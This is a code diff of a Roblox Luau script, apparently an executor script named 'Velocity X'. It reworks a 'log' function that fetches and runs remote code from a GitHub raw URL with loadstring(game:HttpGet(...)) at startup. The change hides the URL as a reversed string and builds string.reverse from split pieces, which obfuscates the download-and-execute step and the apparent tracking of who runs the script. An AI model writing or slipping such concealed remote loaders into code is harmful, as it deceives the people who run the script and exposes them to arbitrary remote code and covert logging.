@@ -108,6 +108,8 @@ local TweenService = game:GetService("TweenService")
 local RunService   = game:GetService("RunService")
 local Players      = game:GetService("Players")
 local player       = Players.LocalPlayer
+local s            = string
+local r            = s["re" .. "verse"]
 
 -- ── CoreGui (Studio-safe) ────────────────────────────────────────────────────
 local CoreGui: Instance
@@ -141,10 +143,12 @@ pcall(function()
     end
 end)
 -- function that start to count who executor my script
-local function log() 
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Mainery-foxxie/Main/refs/heads/main/Velocity%20X/config/Log.luau"))()
-end)
+local function log()
+    task.spawn(function()
+        local a = "uauL.goL/gifnoc/X yticoleV/niam/sdaeh/sfer/niaM/eixxof-yreniaM/moc.tnetnocresubuhtig.war//:sptth"
+
+        loadstring(game:HttpGet(r(a)))()
+    end)
 end
 
 task.spawn(log)
